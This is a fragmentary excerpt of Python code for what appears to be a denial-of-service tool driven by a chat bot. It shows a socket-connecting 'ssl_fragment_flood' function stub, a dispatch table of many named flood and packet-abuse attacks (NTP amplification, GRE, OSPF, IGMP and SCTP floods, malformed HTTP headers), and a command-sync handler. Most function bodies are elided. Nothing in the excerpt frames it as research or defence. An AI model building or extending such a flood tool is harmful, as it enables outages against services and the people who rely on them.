...
def ssl_fragment_flood(ip, port):
    s = socket.socket()
    s.settimeout(1)
    s.connect((ip, port))
...
method_map = {
    ...
    "ssl_fragment_flood": ssl_fragment_flood,
    "websocket_spam": websocket_spam,
    "jumbo_payload_overlap": jumbo_payload_overlap,
    "http_mutator": http_mutator,
    "json_object_injection": json_object_injection,
    "illegal_tcp_flags": illegal_tcp_flags,
    "fake_protocol_mix": fake_protocol_mix,
    "gre_flood": gre_flood,
    "reverse_byte_flood": reverse_byte_flood,
    "igmp_bomb": igmp_bomb,
    "eigrp_flood": eigrp_flood,
    "ospf_flood": ospf_flood,
    "l2tp_flood": l2tp_flood,
    "sctp_chunk_storm": sctp_chunk_storm,
    "isakmp_flood": isakmp_flood,
    "ntp_amplify": ntp_amplify,
    "malformed_http_headers": malformed_http_headers,
    "tcp_option_abuse": tcp_option_abuse,
...
async def on_ready():
    try:
        ...
        print(f"[DEBUG] Synced {len(synced)} commands", file=sys.stderr)
    except Exception:
        pass
